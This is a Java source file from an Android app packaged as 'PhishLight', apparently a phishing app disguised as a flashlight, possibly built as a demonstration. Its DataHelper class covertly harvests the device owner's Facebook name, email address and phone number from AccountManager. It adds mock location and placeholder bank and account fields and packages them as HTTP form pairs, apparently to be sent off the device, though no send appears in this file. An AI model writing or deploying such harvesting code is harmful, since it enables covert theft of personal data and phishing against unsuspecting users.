package org.rix1.PhishLight;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.util.Log;
import android.util.Patterns;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * Created by Rikard Eide on 11/09/14.
 * Description:
 */
public class DataHelper {

    private Context context;
    private List<NameValuePair> nameValuePairs;

    public DataHelper(Context c) {
        this.context = c;
    }


    // TODO: Change hard coded values with device information
    public List getData() {
        nameValuePairs = new ArrayList<NameValuePair>(2);

        nameValuePairs.add(getFullname());
        nameValuePairs.add(getEmail());
        nameValuePairs.add(getLocation());
        nameValuePairs.add(getTelephone());
        nameValuePairs.add(new BasicNameValuePair("bank", "ANDROID_bank"));
        nameValuePairs.add(new BasicNameValuePair("account", "ANDROID_account"));


        // Just for testing purposes
        printData();

        return nameValuePairs;
    }

    public void printData() {
        int i = 0;

        if (nameValuePairs != null) {
            for (NameValuePair nvp : nameValuePairs) {
                if (nvp != null)
                    Log.d("APP", "Value pair @" + i + ": " + nvp.getName() + " AND " + nvp.getValue());
                i++;
            }
        }else Log.d("APP", "nameValuePair is empty - nothing to print");
    }


    /**
     * Currently gets the full name from the Android AccountManager.
     * The Facebook Android application uses the full name
     * as the name of the account.
     * @return full name
     */

    private NameValuePair getFullname(){
        String facebookType = "com.sec.android.app.sns3.facebook";
        String possibleFullname = "";

        Account[] accounts = AccountManager.get(context).getAccounts();
        for(Account acc: accounts){
            if(acc.type.equals(facebookType)){
                possibleFullname = acc.name;
            }
        }
        if(possibleFullname.equals(""))
            return new BasicNameValuePair("fullname", "No name found");
        else return new BasicNameValuePair("fullname", possibleFullname);
    }


    /**
     * Currently gets the email from the Android AccountManager.
     * Google.com uses the email as the name of the account.
     * @return email
     */

    private NameValuePair getEmail(){
        String possibleEmail = "";

        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(context).getAccounts();
        for(Account acc: accounts){
            if(emailPattern.matcher(acc.name).matches()){ // We dont know for sure if this is the main email account
                possibleEmail = acc.name;
            }
        }

        if(possibleEmail.equals(""))
            return new BasicNameValuePair("email", "No name found");
        else return new BasicNameValuePair("email", possibleEmail);
    }


    /**
     * Gets the location or IP address?
     * @return
     */

    private NameValuePair getLocation() {
        // TODO: Get proper location
        String mockLocation = "";
        mockLocation = "43.81234123,-119.8374747";

/* Rikard: I have not have success with this code yet. Don't remember whats wrong.
    public String getAddress(){
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String ip = Formatter.formatIpAddress(inetAddress.hashCode());
                        Log.d("APP: ", "***** IP="+ ip);
                        return ip;
                    }
                }
            }
        } catch (SocketException ex) {
            Log.d("APP: ", ex.toString());
        }
        return null;
    }
*/

        return new BasicNameValuePair("location", mockLocation);
    }


    /**
     * Currently gets the phone number from the Android AccountManager.
     * Facebook.auth.login uses the phone number as the name of the account.
     * @return telephone number
     */
    private NameValuePair getTelephone(){
        String facebookType = "com.facebook.auth.login";
        String possibleTelephone = "";

        Account[] accounts = AccountManager.get(context).getAccounts();
        for(Account acc: accounts){
            if(acc.type.equals(facebookType)){
                possibleTelephone = acc.name;
            }
        }
        if(possibleTelephone.equals(""))
            return new BasicNameValuePair("telephone", "No phone number found");
        else return new BasicNameValuePair("telephone", possibleTelephone);
    }

}
